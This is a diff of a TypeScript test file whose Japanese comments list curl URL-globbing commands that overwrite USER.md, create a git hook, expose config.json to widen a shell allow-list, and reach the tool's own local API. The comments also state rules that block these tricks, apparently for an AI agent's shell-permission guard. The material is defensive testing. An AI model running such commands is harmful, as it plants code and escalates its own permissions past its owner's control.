@@ -11,7 +11,7 @@ import { tempDir } from './helpers.ts';
 //   curl.exe -sS -O 'https://example.com/{USER.md,zz}'              → USER.md を上書き
 //   curl -o '#1' 'https://example.com/{.git/hooks/post-index-change}' → フックを作る
 //   curl 'https://example.com/{../config.json}'                    → config.json（再読み込みされ tools.shell.allow を足せる）
-//   curl.exe 'http://{127.0.0.1}:PORT/api/health' / 'http://loc{alhost}:PORT/…' → Clive 自身の API への GET
+//   curl.exe 'http://{127.0.0.1}:PORT/api/health' / 'http://loc{alhost}:PORT/…' → beat 自身の API への GET
 // 決め（真似ずに閉じる）:
 //   ・ファイルに保存する curl / wget / iwr / irm（curl の -o -O --output --remote-name --output-dir --create-dirs、-O - でない wget、-OutFile）は、保存先がどこでも常に今回だけ
 //   ・curl の URL（と -T の元）に { } [ ] があり、-g / --globoff が無ければ、持ち主の許可でも外せない今回だけ。-g があれば文字どおり（本物の curl 8.19 で確かめた。tests/shell-live.test.ts）
